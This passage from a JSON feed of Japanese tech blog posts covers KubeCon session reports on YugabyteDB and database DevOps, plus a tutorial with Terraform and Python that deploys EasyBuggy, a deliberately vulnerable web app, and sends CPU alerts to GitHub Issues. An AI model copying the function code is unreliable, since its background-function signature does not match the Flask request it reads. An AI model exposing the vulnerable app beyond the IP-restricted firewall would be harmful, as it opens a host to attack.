YugabyteDBYugabyteDBとは？YugabyteDBは、PostgreSQL互換の分散SQLデータベースです。クエリレイヤはPostgreSQLからフォークされ、ストレージレイヤはLSMツリーベースの実装1を採用しています。複数サーバ・複数リージョンでの運用が可能で、クエリ分散やノード障害時の継続動作を実現します。etcdと同様にRaftプロトコルを利用することで、データの一貫性を確保し、ネットワーク分断時のスプリットブレインにも対応します。このセクションはYugabyteDBの特徴を説明し、高可用性と分散性を備えたデータベースとしての利点を明確に示しています。etcdの代替としてYugabyteDBを検討する際に、この情報は非常に重要です。デモyoutu.beYugabyteDBクラスタ上でk3sを実行するデモでは、PostgreSQLの場合とほぼ同様の手順でKubernetesを起動できることが示されました。YugabyteDBのダッシュボードを用いて、データベースの情報やKineが作成した情報を確認できる点も強調されました。さらに、Kubernetesのサンプルアプリを起動することで、etcdベースのKubernetesと同等の動作が確認されました。1台のCompute Engineを停止させることでYugabyteDBノードの障害をシミュレートし、データベースとKubernetesが継続して動作することを実証しました。このデモは、YugabyteDBの耐障害性と高可用性を視覚的に示し、実運用環境での信頼性を裏付けています。結論このセッションは、KineとYugabyteDBを用いることで、etcdの代替としてリレーショナルデータベースをKubernetesのメタデータストアとして利用できることを示しました。特に、YugabyteDBの分散性と耐障害性は、大規模Kubernetesクラスタの運用においてetcdのスケーラビリティやコントリビュータ不足といった課題を解決する可能性を示唆しています。ただし、YugabyteDBの導入には運用コストや学習コストといった新たな課題も発生するため、etcdとの比較検討が必要です。同様にセッションではKineをネイティブに利用しているk3sを利用していますが、k3sはあくまでKubernetesの軽量ディストリビューションであるため完全に同じものではないため、本当にk3sで良いのかという比較検討も必要になります。またセッション内では100を超えるノードから構成されるKubernetesクラスタではetcdのスケーラビリティが足りず、他のメタデータストアが必要になると紹介していますが、なぜ必要になるかは説明が不足していると感じました。これはKubernetesクラスタが大規模化することでAPIサーバが発行するクエリがetcdの対応可能な10000 rpsを越え始めるためです。より詳細な説明はGoogle Cloudの65000ノードを越えるGKEクラスタをSpannerでホストしていることを紹介しているブログが参考になるでしょう。cloud.google.com","isoDate":"2024-12-15T14:16:36.000Z","dateMiliSeconds":1734272196000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Kubernetes The Hard Wayにトライする","link":"https://zenn.dev/moz_sec/articles/0dbb3b7dd08ab3","contentSnippet":"KuberenetesKubernetesとは、複数のコンピュータでコンテナをいい感じに動かしてくれるものです。Kubernetesの説明はいろんなサイトに書いてあるため、そちらを参照してください。公式サイトも参考になります。https://kubernetes.io/docs/concepts/overview/ Kuberentes The Hard WayKubernetes The Hard Wayとは、kubeadmやkubesplayのような、クラスタ構築ツールに頼らず、コンテナランタイムや各コンポーネントを自分でインストールして、設定をし、Kubernetes...","isoDate":"2024-12-15T12:14:59.000Z","dateMiliSeconds":1734264899000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"Reckoner における Datadog Error Tracking の活用事例","link":"https://zenn.dev/nomadblacky/articles/1901ceb9154c7b","contentSnippet":"この記事は、3-shake Advent Calendar 2024 の 15 日目の記事です。 はじめに私の所属する株式会社スリーシェイクでは、Reckoner というデータパイプライン構築の SaaS を開発しています。https://reckoner.io/「SaaSをつなぐ。業務が変わる。ビジネスが進化する。」直感的なユーザーインターフェイスで、多種多様な SaaS のデータをつなぎ合わせることで、データ活用・データの民主化を実現します。Reckoner では多種多様な連携先に対応しているため、様々なエラーが発生する可能性があります。そのため、エラーの迅速な発見と...","isoDate":"2024-12-15T10:35:38.000Z","dateMiliSeconds":1734258938000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"Japan.R 2024に参加した","link":"https://blog.atusy.net/2024/12/15/japanr-2024/","contentSnippet":"Hadley氏を筆頭に、本番環境や実務でRを使う話が多くて印象深かった回。色々な話を聞けてよかった。2019年以来のオフライン開催で久しくお会いしていなかった方とお話できたこと、光栄にも私に会ってみたかったという方に挨拶頂けたりブログが参考になったと言っていただけたこと、発表に対して直に感想をやりとりできたことなど、現地入りしてよかったなあと思います。","isoDate":"2024-12-15T00:00:00.000Z","dateMiliSeconds":1734220800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"KubeCon NA 2024: Database DevOps: CD for Stateful Applicationsのセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/14/database_devops_cd_for_stateful_applications","contentSnippet":"この記事は以下アドベントカレンダー14日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ1Database DevOps: CD for Stateful Applications セッションレポートセッション概要:https://kccncna2024.sched.com/event/1i7na/database-devops-cd-for-stateful-applications-stephen-atwell-harnessio-christopher-crow-pure-storage?linkback=grid-fullセッションスライドhttps://static.sched.com/hosted_files/kccncna2024/86/Harness-Portworx%20Kubecon%202024.pdfこの記事内の画像は全てこのスライドより引用しています。セッション動画  www.youtube.comこのレポートでは、KubeCon + CloudNativeCon North America 2024 のセッション「Database DevOps: CD for Stateful Applications」の内容をまとめたもので、DatabaseのDevOpsとステートフルアプリケーションの継続的デリバリについてです。データベースCDの課題と解決策セッションでは、データパイプラインのデータテストをデリバリパイプラインに統合することの重要性が強調されていました。従来、データベースのテストは、BIツールなどを用いたカスタマイズされた方法で行われることが多かったようですが、最も信頼性の高いテスト方法は、新旧バージョンで同じデータに対してテストを実行することだとスピーカーは主張していました。そして、Kubernetesはこのようなテストを大幅に簡略化できるとのことでした。この主張は、データベースの変更がアプリケーション全体に及ぼす影響を正確に把握し、本番環境へのデプロイ前に潜在的な問題を早期に発見するために非常に重要です。Kubernetesによるデータベース運用の進化セッションで紹介されたアーキテクチャの進化は、Kubernetesがデータベース運用にもたらす利点を明確に示していました。初期のアーキテクチャでは、アプリケーション、データベース、インフラストラクチャの変更が個別に管理されていましたが、発展したアーキテクチャでは、これらが統合されたCI/CDパイプラインで管理されています。この統合により、アプリケーション、データベース、インフラストラクチャの変更をE2Eでテストできるようになり、本番環境へのデプロイリスクを大幅に軽減できます。このアーキテクチャの進化は、マイクロサービスアーキテクチャやクラウドネイティブ開発との親和性が高いと言えます。マイクロサービスでは、個々のサービスが独立してデプロイされるため、データベースの変更が他のサービスに及ぼす影響を正確に把握することが重要です。Kubernetesはこのような複雑な依存関係を管理し、安全なデプロイを実現するための強力なプラットフォームを提供します。デモのオーバービューセッションでは、具体的なスキーママイグレーションのシナリオを例に、ダウンタイムゼロでのデータベース変更を実現する方法が紹介されていました。WarehouseテーブルのLocationカラムの衝突問題を解決するために、CityとStateカラムを追加し、Locationカラムとの同期をトリガーで実現する方法は、実務で非常に役立つアプローチです。この手法は、データベースの変更によるアプリケーションへの影響を最小限に抑え、ユーザー体験を損なうことなくシステムを進化させることを可能にします。デモで利用されるCDパイプラインデモで適用されるデータベースへの変更個人的にはこのようなユースケースのテストシナリオは複雑になることが多いと考えていたため、自動化を行うには相当のカスタマイズが必要になると思っていたので、この後のデモの手軽さには非常に驚かされました。デモのハイライトとHarnessの活用youtu.beこのセッションはデモが全体のほとんどを閉めています。デモ開始時点のリンクがブログ記事の中盤にあるので、デモ部分だけでもご覧になることを強く推奨します。セッションのデモでは、Harnessというツールが使用され、変更プロセスとロールバック手順が分かりやすく可視化されていました。Harnessは、GitLab CI/CDやGitHub ActionsのようなUIを提供し、各ステップの成功/失敗を容易に確認できる点が優れていると感じました。特に、ArgoCDとの連携によるデータベースとアプリケーションの協調動作は、複雑なデプロイプロセスを簡素化する上で非常に効果的です。デモで紹介された、望ましい状態になっていないことを確認し、変更を加えるプロセスは、実践的な知見を提供していました。また、データベースの変更セットの一部として事前にロールバック手順を定義しておくことは、本番環境での予期せぬ問題発生時に迅速な対応を可能にするベストプラクティスと言えるでしょう。LiquibaseやFlywayなどのツールはこのような機能を提供しており、データベースDevOpsの実践において不可欠です。HarnessではデータベースのDevOpsをアプリケーション、インフラストラクチャー込みで実現しており、非常に理想的なツールのように見えました。一方でこのセッションのスピーカーのひとりはHarnes.ioのエンジニアであるため、ポジショントークや見せたい部分しか見せていないことが十分考えられるので全てを鵜呑みにするのは危険です。それを差し引いても興味深いデモだったので、セッションで紹介された技術スタックを検証してみたいと思っています。まとめこのセッションは、Kubernetesとツールを活用することで、データベースの変更を安全かつ効率的に行う方法を示していました。E2Eテスト、ダウンタイムゼロのスキーママイグレーション、そしてロールバック手順の自動化は、データベースDevOpsを実現するための重要な要素です。これらの手法を適切に組み合わせることで、開発速度を向上させながら、システムの安定性と信頼性を維持することが可能になります。しかし、ここで紹介された手法は全ての状況に適用できるわけではありません。例えば、大規模なデータベースや複雑なトランザクション処理を行うシステムでは、ダウンタイムゼロのマイグレーションが困難な場合があります。そのようなケースでは、段階的なロールアウトやカナリアリリースなどの手法を検討する必要があります. また、ツールの導入や運用にはコストがかかるため、組織の規模やリソースに合わせて適切なツールを選択することが重要です。今後のデータベース運用においては、自動化と可観測性をさらに強化し、自己修復機能を備えた自律的なデータベース運用を目指していくことが重要だと考えます。Kubernetesやクラウドネイティブ技術は、この目標を実現するための基盤となるでしょう。またこのセッションを見るまで、個人的にDatabase on KubernetesはKubernetesを利用している組織でマネージドデータベースのコストを安くしたい場合や、データを自分たちのコントロールできる場所におきたい時に利用する選択肢と思っていました。しかしデータベースをKubenetesにデプロイすることでアプリケーションと密接に結合したテストを簡単に行えることがわかり、データベースの運用コストさえ許容できれば、他のメリットがなくてもデータベースをKubernetesで運用するのは十分ありなのではないかと意見が変わりました。今後は単なるデータベースのホスティング環境としてのKubernetes以外の部分にも注目していきたいです。","isoDate":"2024-12-14T18:55:02.000Z","dateMiliSeconds":1734202502000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Cloud Deploy で Cloud Run functions に継続的デリバリーする","link":"https://zenn.dev/kimitsu/articles/cloud-deploy-cloud-run-functions","contentSnippet":"Cloud Deploy は継続的デリバリーを行うための Google Cloud のフルマネージドサービスです。標準では Google Kubernetes Engine と Cloud Run (service と job) へのデプロイをサポートしていますが、カスタムターゲットを定義することでそれ以外の対象にもデプロイすることができます。今回はカスタムターゲットを利用して Cloud Run functions へのデプロイを自動化してみます。本記事では Cloud Deploy の基本的な概念（ターゲット、リリース、デプロイパイプラインなど）については説明しません。これら...","isoDate":"2024-12-14T01:17:49.000Z","dateMiliSeconds":1734139069000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"KubeCon NA 2024: Building Resilience: Effective Backup and Disaster Recovery for Vector Databases on Kubernetes のセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/13/building_resilienc_effective_backup_and_disaster_recovery_for_database_on_lubernetes","contentSnippet":"この記事は以下アドベントカレンダー13日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ2Building Resilience: Effective Backup and Disaster Recovery for Vector Databases on Kubernetes セッションレポートセッション概要:https://kccncna2024.sched.com/event/1i7kn/when-life-gives-you-containers-make-an-open-source-rds-a-kubernetes-love-story-sergey-pronin-perconawww.youtube.comKubeCon + CloudNativeCon North America 2024 のセッション \\"Building Resilience: Effective Backup and Disaster Recovery for Vector Databases on Kubernetes\\" は、AI アプリケーションにおけるベクトルデータベースの重要性と、Kubernetes 上での堅牢なデータ保護戦略の必要性を強調した示唆に富む内容でした。マーケティング的な観点や、聴衆の興味を引くためといった理由からかタイトルでベクトルデータベースとなっていますが、バックアップの部分ではあらゆるデータベースやステートフルワークロードに応用ができる内容でした。AI and Kubernetesセッションは、AI がアプリケーションにもたらす変革的な影響についての概説から始まりました。リソース需要予測による動的スケーリング、異常検知によるセキュリティ向上、UX の改善、そして事前の障害予測による可用性向上など、AI はアプリケーションのあらゆる側面を最適化する可能性を秘めています。そして、これらのメリットを実現する上で、Kubernetes が最適なプラットフォームとして位置づけられています。迅速なデプロイ、高可用性とスケーラビリティ、可搬性と柔軟性、分散ワークロード管理の効率化、そして効率的なバックアップとリカバリといった Kubernetes の特徴は、AI ワークロードの運用に不可欠な要素です。特に、データベースを Kubernetes 上で運用する組織が増加しているという Data on Kubernetes のレポートの言及は、AI/ML ワークロードとデータベース運用の密接な関係性を示唆しており、データベースエンジニアとして注目すべき点でした。Kubernetes がステートフルなアプリケーションの運用基盤として成熟しつつあることを改めて認識させられました。Kubernetes上でAIアプリケーションをデプロイする理由セッションでは、Kubernetes上でAIアプリケーションをデプロイする理由として、迅速なデプロイ、高可用性とスケーラビリティ、可搬性と柔軟性、分散ワークロードの管理の効率化、効率的なバックアップとリカバリ、そしてエコシステムとコミュニティの発展が挙げられていました。これらの利点は、クラウドネイティブな開発と運用を目指す上で非常に重要です。特に、マイクロサービスアーキテクチャを採用する際に、Kubernetes はサービスのデプロイと管理を簡素化し、スケーラビリティと可用性を向上させる上で強力なツールとなります。さらに、ベクトルデータベースのようなステートフルなサービスを Kubernetes 上で運用することで、データの永続性と可用性を確保し、AI アプリケーションの信頼性を向上させることができます。Vector Databases and RAGセッションの中核を成すのが、ベクトルデータベースと RAG (Retrieval Augmented Generation) の解説です。非構造化データの増加に伴い、従来のデータベースでは対応が難しくなってきた画像、テキスト、音声といったデータの効率的な処理が求められています。ベクトルデータベースは、これらの非構造化データをベクトル表現に変換し、類似度検索によって関連性の高い情報を高速に取得することを可能にします。Embedding Model を用いたベクトル化によって、意味的な検索が可能になり、AI アプリケーションの精度と効率性が向上する点が強調されていました。特に、生成 AI アプリケーションにおけるハルシネーション軽減とコンテキスト付与におけるベクトルデータベースの役割は重要です。RAG は、ベクトルデータベースを用いて関連情報を取得し、生成 AI の出力に信頼性を与える手法として紹介されており、今後の AI アプリケーション開発において不可欠な要素となるでしょう。ベクトルデータベースのユースケースセッションでは、ベクトルデータベースのユースケースとして、検索エンジン、画像検索、推薦アルゴリズム、異常検知、そしてチャットボットなどの生成 AI アプリケーションが挙げられていました。これらのユースケースは、現代のアプリケーション開発において非常に重要であり、ベクトルデータベースの適用範囲の広さを示しています。特に、マイクロサービスアーキテクチャにおいて、ベクトルデータベースを独立したサービスとして提供することで、様々なサービスから容易にアクセスできるようになり、システム全体の柔軟性と拡張性を向上させることができます。また、DevOps/SRE の実践においては、ベクトルデータベースの監視と運用を自動化することで、システムの信頼性と可用性を向上させることができます。Data Protectionデータ保護は、Kubernetes 上で運用されるベクトルデータベースにとって不可欠な要素です。データの整合性とセキュリティ、災害復旧、コストと時間の効率化、バージョンコントロール、そしてコンプライアンス規制への準拠など、データ保護は多岐にわたるメリットを提供します。セッションでは、Kubernetes 上でのベクトルデータベースのデータ保護方法として、ストレージスナップショット、データサービスを利用したストレージスナップショット、データサービスレベルのスナップショット、そしてこれらの組み合わせが紹介されました。PVC を利用した永続化データの保護は、Kubernetes ネイティブなデータ保護戦略を構築する上で重要なポイントです。Kanister のようなデータ保護ワークフロー管理ツールは、バックアップとリストアの手順を抽象化し、自動化することで、運用効率を大幅に向上させることができます。Kanister の Blueprint、Profile、ActionSet といった CRD を活用することで、柔軟なデータ保護ワークフローを定義し、Kubernetes の宣言的な運用を実現できます。Kanisterの動作Kanister の動作は、ActionSet が Controller に動作を開始するようにトリガーし、Controller が Blueprint を参照して定義されたオペレーションに従ってベクトルデータベースからバックアップを取得し、オブジェクトストレージに保存するという流れで実行されます。動作完了後、Controller は ActionSet に完了を伝え、ActionSet がユーザーに完了を通知します。この自動化されたワークフローは、データベースエンジニアの運用負荷を軽減し、ヒューマンエラーのリスクを最小限に抑える上で非常に有効です。また、バックアップとリストアのプロセスをコード化することで、再現性と信頼性を向上させることができます。Demoデモでは、書籍推薦チャットボット BookNest を例に、PostgreSQL と PGVector を利用したベクトルデータベースのバックアップとリストアのワークフローが紹介されました。提供された図とデモ動画は、Kanister を用いたデータ保護の実践的な方法を理解する上で非常に役立ちました。具体的な構成例を示すことで、視聴者は自身の環境に合わせたデータ保護戦略を検討する際の参考にすることができます。また、デモを通じて Kanister の操作方法やワークフローの定義方法を視覚的に理解することができ、実践的な知識を深めることができます。Kanister の Blueprint は Kubernetes の manifest 内で ShellScript を書くようなイメージでかけるため、すでに Kubernetesを利用している組織であれば利用に大きなハードルは少なそうだと感じました。Operator 化されたデータベースでは大きなメリットはないかもしれないですが、そうでないデータベースのバックアップや、Operator を使っていても複数の種類がある場合オペレーションの使用ツールの共通化という面で十分メリットがあるでしょう。Call to Actionセッションの締めくくりとして、AI アプリケーションとベクトルデータベースの重要性、そしてデータ保護の必要性が改めて強調されました。データ保護を Day 0 Operation と位置づけるというメッセージは、システム設計の初期段階からデータ保護を考慮することの重要性を示唆しています。システムの保守性、スケーラビリティ、セキュリティを確保する上で、データ保護は不可欠な要素であり、アプリケーション開発ライフサイクル全体を通じて考慮する必要があります。まとめこのセッションは、AI アプリケーションにおけるベクトルデータベースの重要性と、Kubernetes 上での堅牢なデータ保護戦略の構築方法について、具体的な例を交えながら分かりやすく解説していました。特に、Kanister のようなデータ保護ツールを活用することで、複雑なバックアップとリカバリのワークフローを簡素化し、自動化できる点が印象的でした。データベースを Kubernetes 上で運用する際には、データ保護を Day 0 Operation として捉え、Kanister のようなツールを活用することで、システムの信頼性と可用性を向上させることができます. セッションで提示された情報は、今後のデータベース運用戦略を検討する上で非常に貴重な示唆を与えてくれました。このセッションで扱われなかった点として、ベクトルデータベースの選択基準やパフォーマンスチューニング、そして異なるベクトルデータベースにおけるデータ保護戦略の差異などが挙げられます。今後のセッションでは、これらの点についても掘り下げて議論されることを期待します。","isoDate":"2024-12-13T08:57:05.000Z","dateMiliSeconds":1734080225000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"ｻｯとかざして即起動! 推しグッズを神曲再生アイテムに(*\xb0∀\xb0)","link":"https://zenn.dev/nedoko_dok0dko/articles/9db9d10902ec03","contentSnippet":"※3-shake Advent Calendar 2024の13日目のエントリー記事です。本日、12月13日は金曜日。世の中では「ジェイソンの日」なんて言われています。とはいえ、生まれてこの方ジェイソンの映画を見ることがなかったためこの手の話についてはかなり縁遠い気がしていします。(JSONの方先に連想しちゃいますし)むしろ「華金だーー＼(^o^)／」くらいしか考えていません。それしかありません。そんな社会人です。さて、今年もやってまいりましたアドベントカレンダー。2024年も引き続き参加させていただく運びとなりました。テーマは前回同様「技術・非技術関係なし!自由!」ということ...","isoDate":"2024-12-12T15:00:01.000Z","dateMiliSeconds":1734015601000,"authorName":"seno","authorId":"seno"},{"title":"Japan.R 2024で地域コミュニティのOsaka.Rについて発表した","link":"https://blog.atusy.net/2024/12/12/japanr-logging/","contentSnippet":"前の発表で力尽きてて、何も考えずに楽しくお話しちゃった回。","isoDate":"2024-12-12T00:00:00.000Z","dateMiliSeconds":1733961600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"GolangからPagerdutyのインシデントを発砲する","link":"https://zenn.dev/tayusa/articles/9091399d6a9018","contentSnippet":"目的Golangで作成したアプリケーションからPagerdutyの任意のインシデントを発砲する Event API v2https://developer.pagerduty.com/docs/3d063fd4814a6-events-api-v2-overview高信頼性、高可用性の非同期APIでシステムからマシンイベントを取り込みます。このAPIに送られたイベントは最終的にPagerDutyサービスにルーティングされ処理されます Event Types Alert監視システムの問題。 既存のアラートを確認または解決するためにイベントを送信することができる...","isoDate":"2024-12-11T13:30:34.000Z","dateMiliSeconds":1733923834000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Google Cloud monitoringのアラートをGitHub Issueに通知する","link":"https://kechigon.hatenablog.com/entry/2024/12/11/182649","contentSnippet":"タイトルの通り、Google Cloud monitoringのアラートをGitHub Issueに通知するシステムの構築方法を紹介します。terrafromを使って作成します。コードはGitHubリポジトリにまとまっています。github.comこのコードをapplyすることで、Webサービス(EasyBuggy)、監視、アラートをIssueに持っていくパイプラインがデプロイされます。システム図このような構成をとっています。main.tf早速コードを紹介していきます。このファイルでは、EasyBuggyという脆弱なWebサービスをGCEにデプロイします。terraform {  required_providers {    google = {        source = \\"hashicorp/google\\"        version = \\"5.39.0\\"    }  }}provider \\"google\\" {  credentials = var.credential_file  project     = var.project  region      = var.region}resource \\"google_compute_instance\\" \\"easybuggy\\" {  name         = \\"easybuggy-instance\\"  machine_type = \\"n1-standard-1\\"  zone         = var.zone  boot_disk {    initialize_params {      image = \\"debian-cloud/debian-11\\"    }  }  network_interface {    network = \\"default\\"        access_config {}  }  metadata = {    \\"enable-osconfig\\" = \\"true\\"  }     metadata_startup_script = <<EOF#!/bin/bashsudo apt-get updatefor pkg in docker.io docker-doc docker-compose podman-docker containerd runc; do sudo apt-get remove $pkg; donesudo apt-get install -y ca-certificates curl git sudo install -m 0755 -d /etc/apt/keyringssudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.ascsudo chmod a+r /etc/apt/keyrings/docker.ascecho \\\\  \\"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian \\\\  $(. /etc/os-release && echo \\"$VERSION_CODENAME\\") stable\\" | \\\\sudo tee /etc/apt/sources.list.d/docker.list > /dev/nullsudo apt-get updatesudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-pluginsudo git clone https://github.com/k-tamura/easybuggy.gitcd easybuggysudo docker build . -t easybuggy:local sudo docker run -p 8080:8080 easybuggy:local EOF}resource \\"google_compute_firewall\\" \\"allow-home-ip\\" {  name    = \\"allow-home-ip\\"  network = \\"default\\"   allow {    protocol = \\"tcp\\"    ports    = [\\"8080\\"]  }  source_ranges = [var.my_ip]}output \\"instance_ip\\" {  value = google_compute_instance.easybuggy.network_interface[0].access_config[0].nat_ip}monitoring.tfこちらのファイルでは監視、アラートをIssueに持っていくパイプラインをデプロイします。main.tfでデプロイしたインスタンスのCPU使用率が80%を超えるとアラートが発生します。resource \\"google_pubsub_topic\\" \\"alerts_topic\\" {  name = \\"alerts-topic\\"}resource \\"google_pubsub_subscription\\" \\"alerts_subscription\\" {  name  = \\"alerts-subscription\\"  topic = google_pubsub_topic.alerts_topic.name}resource \\"google_monitoring_notification_channel\\" \\"pubsub_channel\\" {  display_name = \\"Pub/Sub to Cloud Function\\"  type         = \\"pubsub\\"  labels = {    \\"topic\\" = google_pubsub_topic.alerts_topic.id  }}resource \\"google_pubsub_topic_iam_binding\\" \\"alerts_topic_publisher\\" {  topic = google_pubsub_topic.alerts_topic.name  role    = \\"roles/pubsub.publisher\\"  members = [    \\"serviceAccount:service-${var.project_id}@gcp-sa-monitoring-notification.iam.gserviceaccount.com\\"  ]}resource \\"google_storage_bucket\\" \\"easybuggy_monitoring_function_bucket\\" {  name          = \\"easybubby_monitoring-functions-bucket\\"  location      = \\"ASIA-NORTHEAST1\\"  force_destroy = true}resource \\"google_storage_bucket_object\\" \\"function_source_object\\" {  name   = \\"function-source.zip\\"  bucket = google_storage_bucket.easybuggy_monitoring_function_bucket.name  source = \\"function-source.zip\\"}resource \\"google_cloudfunctions_function\\" \\"issue_creator_function\\" {  name        = \\"issue-creator-function\\"  description = \\"Receive Pub/Sub message from Google Cloud Monitoring and create a GitHub issue\\"  runtime    = \\"python39\\"  source_archive_bucket = google_storage_bucket.easybuggy_monitoring_function_bucket.name  source_archive_object = google_storage_bucket_object.function_source_object.name  entry_point           = \\"main\\"  region                = var.region  environment_variables = {    \\"GITHUB_API_TOKEN\\" = var.github_api_token    \\"GITHUB_REPO\\"      = var.github_repo    \\"GITHUB_OWNER\\"     = var.github_owner  }  event_trigger {    event_type = \\"providers/cloud.pubsub/eventTypes/topic.publish\\"    resource   = google_pubsub_topic.alerts_topic.id  }}resource \\"google_monitoring_alert_policy\\" \\"cpu_usage_policy\\" {  display_name = \\"High CPU Utilization Alert\\"  combiner     = \\"OR\\"  conditions {    display_name  = \\"CPU usage over 80%\\"    condition_threshold {      filter          = \\"metric.type=\\\\\\"compute.googleapis.com/instance/cpu/utilization\\\\\\" AND resource.type=\\\\\\"gce_instance\\\\\\"\\"      duration        = \\"60s\\"      comparison      = \\"COMPARISON_GT\\"      threshold_value = 0.8      }  }  enabled = true  notification_channels = [google_monitoring_notification_channel.pubsub_channel.id]}main.pyfunctionsで実行されるコードです。pub/subから受け取ったデータからアラートのtitleとbodyを抜き出してGithub Issueにポストします。import base64import jsonimport osimport loggingimport requestsfrom flask import Flask, requestapp = Flask(__name__)GITHUB_API_TOKEN = os.environ.get(\'GITHUB_API_TOKEN\')GITHUB_REPO = os.environ.get(\'GITHUB_REPO\')GITHUB_OWNER = os.environ.get(\'GITHUB_OWNER\')logging.basicConfig(level=logging.INFO)logger = logging.getLogger(__name__)def create_github_issue(data):    issue_title = f\\"Alert: {data[\'incident\'][\'incident_id\']}\\"    issue_body = data[\'incident\'][\'summary\']    logger.info(f\\"Creating issue with title: {issue_title} body: {issue_body}\\")    response = requests.post(        f\\"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/issues\\",        headers={            \\"Authorization\\": f\\"token {GITHUB_API_TOKEN}\\",            \\"Accept\\": \\"application/vnd.github.v3+json\\",        },        json={            \\"title\\": issue_title,            \\"body\\": issue_body,        },    )    if response.status_code == 201:        logger.info(\\"Issue created successfully\\")        return \\"Issue created successfully\\", 201    else:        logger.error(f\\"Failed to create issue: {response.content}\\")        return f\\"Failed to create issue: {response.content}\\", response.status_code@app.route(\'/\', methods=[\'POST\'])def main(d, context): #Need to receive arguments    envelope = request.get_json()        if not envelope:        logger.error(\\"No envelope received\\")        return \\"Bad Request\\", 400        logger.info(f\\"envelope: {envelope}\\")    pubsub_data = envelope.get(\'data\', {})    logger.info(f\\"pub_sub_data\\")    if not pubsub_data:        logger.error(f\\"No outside data received: \\")        return \\"Bad Request\\", 400    try:        data_base64 = pubsub_data.get(\'data\', \'\')        if not data_base64:            raise ValueError(\\"No data field in outside data\\")                data = base64.b64decode(data_base64.encode(\'utf-8\')).decode(\'utf-8\')        logger.info(f\\"Decoded data: {data}\\")        data = json.loads(data)                logger.info(f\\"Received data: {data}\\")    except Exception as e:        logger.error(f\\"Error processing message: {e}\\")        return \\"Bad Request\\", 400        return create_github_issue(data)if __name__ == \\"__main__\\":    app.run()デプロイ内容を理解したらterraform applyしましょう。アプライが成功したらインスタンスIPが表示されます。動作確認http://instance_ip:8080にブラウザでアクセスするとこのような画面になります。「無限ループ」のリンクを押し、無限ループを発生させましょう。CPU使用率が80%を超えたことを確認し、GitHub Issueを確認すると、アラートが通知されています。以上がGoogle Cloud monitoringのアラートをGitHub Issueに通知する流れとなります。","isoDate":"2024-12-11T09:26:49.000Z","dateMiliSeconds":1733909209000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"Kube-schedulerプラグインCoschedulingを体験してみた","link":"https://zenn.dev/k_nagase/articles/co_scheduling","contentSnippet":"本記事は 3-shake Advent Calendar 2024 シリーズ 1 の 11 日目の記事です。 はじめにここ最近Kubernetesのスケジューリングについて調査する機会があり、その一環でスケジューラープラグインの1つであるCoschedulingについても調査しました。この時の調査と簡単なハンズオンについてこの記事でまとめてみたいと思います。Kubernetesのコントロールプレーンの1コンポーネントであるスケジューラはpluginによる機能拡張が可能です。プラグインは以下のリポジトリにまとまっています。https://github.com/kubernetes...","isoDate":"2024-12-11T01:00:01.000Z","dateMiliSeconds":1733878801000,"authorName":"Kohei Nagase","authorId":"k-nagase"},{"title":"コマンド一発で、本格的なおうちKubernetesを構築する","link":"https://speakerdeck.com/melanmeg/komando-fa-de-ben-ge-de-naoutikuberneteswogou-zhu-suru","contentSnippet":"作成したリポジトリ：\\rhttps://github.com/melanmeg/k8s_1-30_on_noble\\r\\r参考：\\rhttps://github.com/unchama/kube-cluster-on-proxmox\\rhttps://k8sh.net/arch/\\rhttps://www.server-world.info/query?os=Ubuntu_24.04&p=kubernetes&f=1\\rhttps://www.youtube.com/watch?v=7BLmtR1nhcY","isoDate":"2024-12-10T05:00:00.000Z","dateMiliSeconds":1733806800000,"authorName":"Naoya Yamamoto","authorId":"melanmeg"},{"title":"スリーシェイクインタビュー: 技術顧問 うたもくさん編","link":"https://sreake.com/blog/interview-utam0k/","contentSnippet":"こんにちは。スリーシェイクのSreake事業部所属の早川(@bells17)です。 今回は7月からスリーシェイクの技術顧問に就任してもらったうたもくさん(@utam0k)に対談形式でインタビューをさせていただきましたので […]The post スリーシェイクインタビュー: 技術顧問 うたもくさん編 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-10T04:16:19.000Z","dateMiliSeconds":1733804179000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Japan.R 2024で構造化ログについて発表した","link":"https://blog.atusy.net/2024/12/10/japanr-logging/","contentSnippet":"オフラインイベントはリアクションがもらえて楽しい。準備や質問を通じて学びもいっぱい。またやりたい。","isoDate":"2024-12-10T00:00:00.000Z","dateMiliSeconds":1733788800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"LookMLで値を変換したい？それならcaseはいかが?","link":"https://zenn.dev/nedoko_dok0dko/articles/c677f78d5ae2b0","contentSnippet":"はじめに※本投稿はLooker Advent Calendar 2024 の10日目の記事となりますはじめまして。偶然業務でLookerに出会い、そこから色々触っているデータエンジニアです。Lookerについてはまだまだ駆け出しの身ではありますが、少しずつ分かる事が増え、Lookerへの理解が深まってきたと感じています。今回はそんな初心者がLookerのフィールドパラメータであるcaseを触ってみた話です。 想定読者Lookerについて基本概要を知っているLookMLを知っているLookMLを触ったことがある・実装したことがある 背景・経緯※情報に関して...","isoDate":"2024-12-09T16:42:38.000Z","dateMiliSeconds":1733762558000,"authorName":"seno","authorId":"seno"},{"title":"オレのNeovim見て！ 2024","link":"https://blog.atusy.net/2024/12/09/awesome-my-neovim/","contentSnippet":"Vim/Neovimに興味を持ってほしくて、私のNeovimのカッコイイところ集を作ってみました。","isoDate":"2024-12-09T00:00:00.000Z","dateMiliSeconds":1733702400000,"authorName":"Atsushi 